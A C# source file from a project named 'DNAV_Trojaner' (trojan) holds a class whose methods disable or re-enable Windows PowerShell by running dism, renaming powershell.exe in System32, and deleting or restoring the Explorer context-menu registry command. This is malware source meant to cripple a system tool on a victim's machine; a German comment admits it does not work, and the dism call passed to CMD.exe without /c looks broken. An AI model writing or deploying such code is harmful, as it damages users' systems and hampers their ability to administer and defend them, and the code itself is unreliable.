using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace DNAV_Trojaner
{
    public class Powershell
    {
        // Funktioniert aktuell nicht, da zu tief in Windows verankert und erfordert höhere Rechte als Admin
        public static void Disable()
        {
            Process.Start("CMD.exe", "dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2");
            if (File.Exists(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
            {
                File.Move(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@"Directory\shell\Powershell");
            key.DeleteSubKey("command");
        }

        public static void DisableRoot()
        {
            Process.Start("CMD.exe", "dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2Root");
            if (File.Exists(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"))
            {
                File.Move(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@"Directory\shell\Powershell");
            key.DeleteSubKey("command");
        }

        public static void Enable()
        {
            Process.Start("CMD.exe", "dism /online /enable-feature /featurename:MicrosoftWindowsPowerShellV2");
            if (File.Exists(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak"))
            {
                File.Move(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@"Directory\shell\Powershell");
            RegistryKey command = key.CreateSubKey("command");
            command.SetValue("", "powershell.exe -noexit -command Set-Location -literalPath '%V'");
        }

        public static void EnableRoot()
        {
            Process.Start("CMD.exe", "dism /online /enable-feature /featurename:MicrosoftWindowsPowerShellV2Root");
            if (File.Exists(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak"))
            {
                File.Move(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe.bak", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe");
            }
            RegistryKey key = Registry.ClassesRoot.OpenSubKey(@"Directory\shell\Powershell");
            RegistryKey command = key.CreateSubKey("command");
            command.SetValue("", "powershell.exe -noexit -command Set-Location -literalPath '%V'");
        }
    }
}
